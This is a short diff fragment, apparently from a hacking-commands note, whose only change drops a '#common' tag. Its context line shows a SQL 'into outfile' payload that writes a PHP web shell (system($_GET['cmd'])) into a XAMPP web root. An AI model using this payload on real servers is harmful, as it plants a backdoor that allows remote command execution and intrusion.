@@ -14,4 +14,4 @@ SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoo
 
 Tags:
 
-    #command #hacking #common 
+    #command #hacking
